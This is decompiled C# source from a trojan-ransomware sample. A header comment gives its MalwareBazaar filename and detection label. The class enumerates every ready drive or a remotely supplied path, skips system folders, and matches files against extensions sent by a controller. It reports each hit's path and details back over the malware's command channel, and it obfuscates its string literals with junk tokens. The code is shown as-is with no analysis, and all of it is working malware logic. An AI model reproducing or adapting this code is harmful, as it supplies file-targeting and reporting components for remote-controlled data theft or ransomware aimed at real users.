// Decompiled with JetBrains decompiler
// Type: gltadbrigr.PCDDRPIVF
// Assembly: gltadbrigr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 90EF545C-9E75-40E4-A102-AD83A77103BB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4342dd4999d1247fc9032003bafb7d3d58d2cbefe1705d5d91e258d0ed1fef86.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace gltadbrigr
{
  internal class PCDDRPIVF
  {
    public List<string> gltadbrigrfExts = new List<string>();
    public bool gltadbrigrreaging = false;
    public string gltadbrigrmainPath;
    public MARRCMD iserver;
    public int gltadbrigrsIndx = 0;
    public List<string> gltadbrigrnotFilders = new List<string>();
    public List<string> gltadbrigrsFiles = new List<string>();
    public int gltadbrigrfIndx = 0;

    public IEnumerable<string> gltadbrigradduFiles(string path)
    {
      Queue<string> moreFiles = new Queue<string>();
      moreFiles.Enqueue(path);
      while (moreFiles.Count > 0 && !this.iserver.gltadbrigrautuCnls)
      {
        path = moreFiles.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            if (this.gltadbrigrseeuAccess(directory) && !this.gltadbrigrnotFilders.Contains(directory.ToLower()))
              moreFiles.Enqueue(directory);
          }
        }
        catch
        {
        }
        string[] files = Directory.GetFiles(path);
        if (files != null)
        {
          for (int i = 0; i < files.Length; ++i)
            yield return files[i];
        }
      }
    }

    public void gltadbrigrlookuFiles(string tempStr)
    {
      this.iserver.gltadbrigrautuCnls = false;
      this.gltadbrigrfExts.Clear();
      this.gltadbrigrsFiles.Clear();
      this.gltadbrigrfIndx = 0;
      this.gltadbrigrsIndx = 0;
      string[] strArray = tempStr.Split('<');
      if (strArray.Length <= 1)
        return;
      string str1 = strArray[0];
      char[] chArray = new char[1]{ '>' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2 != "")
          this.gltadbrigrfExts.Add(str2);
      }
      if (strArray[1] != "")
      {
        this.gltadbrigrreaging = true;
        this.gltadbrigrsenduSearch(strArray[1]);
        this.gltadbrigrreaging = false;
        this.iserver.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-seuard=seauhing!gltadbrigr".Split('!')[0]);
      }
      else
      {
        DriveInfo[] drives = DriveInfo.GetDrives();
        this.gltadbrigrreaging = true;
        foreach (DriveInfo driveInfo in drives)
        {
          if (driveInfo.IsReady)
            this.gltadbrigrsenduSearch(driveInfo.Name);
        }
        this.iserver.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-seuard=searuching!gltadbrigr".Split('!')[0]);
        this.gltadbrigrreaging = false;
      }
    }

    public PCDDRPIVF()
    {
      this.gltadbrigrnotFilders.Add("program files (x86)|gltadbrigr".Split('|')[0]);
      this.gltadbrigrnotFilders.Add("windows|gltadbrigr".Split('|')[0]);
      this.gltadbrigrnotFilders.Add("programdata|gltadbrigr".Split('|')[0]);
      this.gltadbrigrnotFilders.Add("program files|gltadbrigr".Split('|')[0]);
      this.gltadbrigrnotFilders.Add("system volume information|gltadbrigr".Split('|')[0]);
    }

    public string gltadbrigrcheckuFolders(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string directory in Directory.GetDirectories(path))
        {
          if (this.gltadbrigrseeuAccess(directory))
            str = str + directory + ">|gltadbrigr".Split('|')[0];
        }
      }
      return str;
    }

    public void gltadbrigrsenduSearch(string path)
    {
      try
      {
        foreach (string gltadbrigradduFile in this.gltadbrigradduFiles(path))
        {
          if (this.gltadbrigrfExts.Contains(Path.GetExtension(gltadbrigradduFile).ToLower()))
          {
            string str = this.iserver.gltadbrigrCMD.gltadbrigrfile_inufo(gltadbrigradduFile, true);
            this.iserver.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-seuarf=!gltadbrigr".Split('!')[0] + gltadbrigradduFile + "<FILUE_AUUTO<!gltadbrigr".Split('!')[0] + str);
          }
          if (this.iserver.gltadbrigrautuCnls)
            break;
        }
      }
      catch
      {
      }
    }

    public bool gltadbrigrseeuAccess(string fPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
      try
      {
        directoryInfo.GetDirectories();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public string gltadbrigrlookupuFiles(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path))
          str = str + file + ">|gltadbrigr".Split('|')[0];
      }
      return str;
    }

    public string gltadbrigrlookupDrives()
    {
      string str = "";
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          str = str + drive.Name + ">!gltadbrigr".Split('!')[0];
      }
      return str;
    }
  }
}
